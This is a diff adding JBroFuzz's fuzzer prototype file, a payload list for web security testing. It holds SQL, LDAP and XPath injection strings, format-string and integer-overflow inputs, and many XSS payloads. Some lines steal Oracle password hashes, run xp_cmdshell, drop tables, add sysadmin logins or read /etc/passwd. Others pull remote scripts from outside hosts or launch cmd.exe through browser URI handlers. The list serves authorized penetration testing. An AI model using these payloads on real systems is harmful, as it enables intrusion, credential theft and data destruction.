@@ -1,0 +1,1309 @@
+#
+# JBroFuzz Fuzzer Prototypes
+#
+# Copyright (c) 2010 
+# subere@uncon.org
+# version 2.4
+#
+
+P:001-HTT-PMT:HTTP Methods:15
+> HTTP | Replacive Fuzzers 
+>>This is a comment line to be changed in the future
+get
+post
+head
+put
+delete
+trace
+propfind
+options
+copy
+move
+mkcol
+proppatch
+lock
+unlock
+search
+
+P:002-INT-OVF:Integer Overflows:12
+> Exploits | Replacive Fuzzers | Integer Overflows
+>>This is a comment line to be changed in the future
+-1
+0
+0x100
+0x1000
+0x3fffffff
+0x7ffffffe
+0x7fffffff
+0x80000000
+0xfffffffe
+0xffffffff
+0x10000
+0x100000
+
+P:003-FSE-STR:Format String Payloads:19
+> Exploits | Replacive Fuzzers | Format String Errors 
+>>This is a comment line to be changed in the future
+%s%p%x%d
+.1024d
+%.2049d
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%99999999999s
+%08x
+%%20d
+%%20n
+%%20x
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%z%t%i%e%g%f%a%c%s%08x%%
+f(x)=%sasdf x 129
+f(x)=%x x 257
+
+P:004-SQL-INJ:SQL Injection:16
+> Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
+a
+a' 
+a' --
+a' or 1=1; --
+@
+?
+' and 1=0) union all
+? or 1=1 --
+x' and userid is NULL; --
+x' and email is NULL; --
+anything' or 'x'='x
+x' and 1=(select count(*) from tabname); --
+x' and members.email is NULL; --
+x' or full_name like '%bob%
+23 or 1=1; --
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+
+P:005-SQL-INJ:MySQL Injection 101:4
+> Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
+a
+1 or 1=1
+1' or '1'='1
+1 and user_name() = 'dbo'
+
+P:006-SQL-INJ:MySQL Injection (Blind):5
+> Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
+1
+1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+
+P:007-SQL-INJ:MySQL/MS SQL Common Injection:9
+> Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
+1
+1 and user_name() = 'dbo'
+\'; desc users; --
+1\'1
+1' and non_existant_table = '1
+' or username is not NULL or username = '
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+1 uni/**/on select all from where
+
+P:008-SQL-INJ:Oracle SQL Injection:54
+> Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
+’ or ‘1’=’1
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' || myappadmin.adduser('admin', 'newpass') || '
+' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i
+
+
+P:009-SQL-INJ:Passive SQL Injection:55
+> Replacive Fuzzers | SQL Injection | Injection
+>>This is a comment line to be changed in the future
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' or 1=1-- 
+or 1=1
+' or '1'='1
+; or '1'='1'
+" or isNULL(1/0) /*
+' or '7659'='7659
+" or isNULL(1/0) /*
+' -- 
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+admin' or '
+' select * from information_schema.tables--
+) union select * from information_schema.tables;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' select name from syscolumns where id = (select id from sysobjects where name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' or 'unusual' = 'unusual'
+' or 'something' = 'some'+'thing'
+' or 'text' = n'text'
+' or 'something' like 'some%'
+' or 2 > 1
+' or 'text' > 't'
+' or 'whatever' in ('whatever')
+' or 2 between 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select 
+password:*/=1--
+uni/**/on sel/**/ect
+'; execute immediate 'sel' || 'ect us' || 'er'
+'; exec ('sel' + 'ect us' + 'er')
+'/**/or/**/1/**/=/**/1
+' or 1/*
+ or isNULL(1/0) /*
+' or '7659'='7659
+" or isNULL(1/0) /*
+' -- &password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+@var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+
+P:010-SQL-INJ:Active SQL Injection:9
+> Replacive Fuzzers | SQL Injection| Injection
+>>This is a comment line to be changed in the future
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+create user name identified by 'pass123'
+create user name identified by pass123 temporary tablespace temp default tablespace users; 
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))
+grant connect to name; grant resource to name;
+insert into users(login, password, level) values( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+
+P:011-SQL-INJ:MS SQL Injection i:8
+> SQL Injection | Injection | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+a
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+
+P:012-SQL-INJ:MS SQL Ninja Injection (Blind):9
+> SQL Injection | Injection | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+a
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+
+P:013-LDP-INJ:LDAP Injection:14
+> Replacive Fuzzers | LDAP Injection | Injection
+>>This is a comment line to be changed in the future
+|
+!
+(
+)
+&
+!
+|
+*|
+*(|(mail=*))
+*(|(objectclass=*))
+*()|&'
+admin*
+admin*)((|userpassword=*)
+*)(uid=*))(|(uid=*
+
+P:014-XPT-INJ:XPath Injection:10
+> Replacive Fuzzers | XPath Injection | Injection
+>>This is a comment line to be changed in the future
+' or '1'='1
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x' or name()='username' or 'x'='y
+
+P:015-XSS-101:XSS 101:9
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+<script>alert('xss')</script>
+<script>alert(string.fromcharcode(88,83,83))</script>
+</title><script>alert(1)</script>
+'> <script>alert(3)</script>
+`> <script>alert(5)</script>
+> <script>alert(4)</script>
+</title><script>alert(1)</script>
+<<script>alert("xss");//<</script>
+>"'
+
+P:016-XSS-102:XSS 102:10
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+'';!--"<XSS>=&{()}
+*/a=eval;b=alert;a(b(/e/.source));/*
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//
+</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
+perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
+<DIV STYLE="background-image: url(http://ha.ckers.org/xss.js)">Div Body</DIV> 
+
+P:017-XSS-JSB:XSS JS Breaks:11
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+alert(1)
+A=alert;A(1)
++alert(0)+
+';//%0da=eval;b=alert;a(b(9));//
+a=1;a=eval;b=alert;a(b(11));//
+'};a=eval;b=alert;a(b(13));//
+1};a=eval;b=alert;a(b(14));//
+'];a=eval;b=alert;a(b(15));//
+1];a=eval;b=alert;a(b(17));//
+1;a=eval;b=alert;a(b(/c/.source));
+xyz onerror=alert(6);
+
+P:018-XSS-4IE:XSS Internet Explorer:38
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+<img src=`x` onrerror= ` ;; alert(1) ` />
+</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+style=color: expression(alert(0));" a="
+vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<DIV STYLE="width: expression(alert('XSS'));">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>
+<IMG DYNSRC="javascript:alert('XSS');">
+<IMG LOWSRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMGSRC="javascript:alert('XSS')">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+
+P:019-XSS-GEK:XSS Gecko:11
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+(1?(1?{a:1?""[1?"ev\a\l":0](1?"\a\lert":0):0}:0).a:0)[1?"\c\a\l\l":0](content,1?"x\s\s":0)
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http://ha.ckers.org@google">XSS</A>
+<A HREF="//google">XSS</A>
+<IFRAME SRC=http://ha.ckers.org/scriptlet.html <
+y=<a>alert</a>;content[y](123)
+sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+with(document.__parent__)alert(1)
+style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+
+P:020-XSS-INJ:XSS Style Injection:14
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+style=color: expression(alert(0));" a="
+style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+P:021-XSS-HTM:XSS HTML Breaking:7
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+<s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}");}
+'';!--"<script>alert(0);</script>=&{(alert(1))}
+</title><script>alert(1)</script>
+</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+'';!--"<XSS>=&{()}
+
+P:022-XSS-EMB:XSS Embed/Evade:10
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+P:023-XSS-IMG:XSS Image Tag:10
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">",
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
+
+P:024-XSS-NET:ASP .NET validateRequest:5
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+</XSS STYLE=xss:expression(alert('XSS'))>
+XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS-STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+"><script>alert('XSS')</script>
+
+P:025-XSS-XML:XSS XML Injection:6
+> XSS | XML Injection | Replacive Fuzzers | Injection
+>>This is a comment line to be changed in the future
+<xml id=i><x><c><![cdata[<img src="javas]]><![cdata[cript:alert('xss');">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>
+<xml id="xss"><i><b><img src="javas<!-- -->cript:alert('xss')"></b></i></xml><span datasrc="#xss" datafld="b" dataformatas="html"></span>
+<html><body><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributename="innerhtml" to="xss<script defer>alert('xss')</script>"> </body></html>
+<html xmlns:xss><?import namespace="xss" implementation="httP://ha.ckers.org/xss.htc"><xss:xss>xss</xss:xss></html>
+<xml src="httP://ha.ckers.org/xsstest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
+<?xml version="1.0"?><html:html xmlns:html='httP://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
+
+P:026-XSS-URI:URI Cross Site Scripting:4
+> XSS | URI Exploits | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
+res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+
+
+P:027-XSS-JSN:JSON:5
+> XSS | Replacive Fuzzers
+>>This is a comment line to be changed in the future
+<body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
+<body onload=a1={x:this.parent.document};a1.x.writeln(1);>
+<body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
+<body/s/onload=x={doc:parent.document};x.doc.writeln(1)
